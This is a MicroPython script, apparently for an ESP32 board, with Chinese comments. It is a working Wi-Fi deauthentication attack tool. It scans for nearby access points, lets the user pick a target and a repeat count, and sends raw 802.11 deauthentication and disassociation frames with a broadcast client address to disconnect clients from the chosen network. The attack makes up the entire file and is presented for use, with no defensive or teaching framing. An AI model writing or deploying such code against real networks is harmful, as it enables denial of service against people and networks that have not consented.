
import network, time, uos, wireless ,ubinascii


#sta = network.WLAN(network.STA_IF)
sta = wireless.attack(network.STA_IF)
sta.active(True)
ssid =''
bssid =''                                    
channel =''
_client = [0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]     #預設 MAC address

def scanAp():
    ap_list = sta.scan()
    print("******************************")
    print('{:>2} {:<20} {:<20}'.format('', 'SSID', '   MAC ADDRESS'))
    # 使用格式化字串來對齊輸出結果
    for index, ap in enumerate(ap_list):
    # enumerate 可以取得資料的索引
        ssid = ap[0].decode()
        mac = ubinascii.hexlify(ap[1], ':').decode()
        print('{:>2} {:<20} {:>17}'.format(index, ssid, mac))
    print("******************************")
    return ap_list

def send_frame(destination, source, type, reason):
    packet = bytearray([0xC0, 0x00,                         # 0 - 1：訊框類型, 子類型                 
                        0x00, 0x00,                         # 2 - 3：持續佔用頻道時間                 
                        0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, # 4 - 9：目標位址
                        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, # 10 - 15：來源位址
                        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, # 16 - 21：AP MAC 位址
                        0x00, 0x00,                         # 22 - 23：序列控制欄位
                        0x01, 0x00])                        # 24 - 25：回應訊息碼
    for i in range(0,6):
        packet[4 + i] = destination[i]                  #代入目標位址
        packet[10 + i] = packet[16 + i] = source[i]     #代入來源位址    
    packet[0] = type                                    #設定訊框種類
    packet[24] = reason                                 #回應訊息碼
    result = sta.send_pkt_freedom(packet)               #送出訊框
    if result==0:
        time.sleep_ms(1)
        return True
    else:
        return False
    
while True:
    ap_list = scanAp()
    tgtIndex = input('請輸入目標編號 (留空再次掃描) : ')
    if tgtIndex == '':
        continue
    else:
        tgtIndex = int(tgtIndex)
    atknum = int(input('執行次數 : ') or '20')        

    ssid = ap_list[tgtIndex][0]    
    bssid = ap_list[tgtIndex][1]
    channel = ap_list[tgtIndex][2]

    print('ssid:',ssid,'-bssid:',bssid)
    print('******************************')
    if sta.setAttack(channel):
        print('Set Attack OK')
        time.sleep_ms(100)
        print('---deauth runing-----')
        for i in range(0,atknum):
        #根據輸入的攻擊次數重複執行
            r_ = send_frame(bssid, _client, 0xC0, 0x01)
            #先對目標 AP 發送 deauth 請求

            if r_:                
                send_frame(bssid, _client, 0xA0, 0x01)      
                #對目標 AP 發送 disassociate 請求

                time.sleep_ms(5)
            else:
                print('---deauth fail-------')
            time.sleep_ms(200)
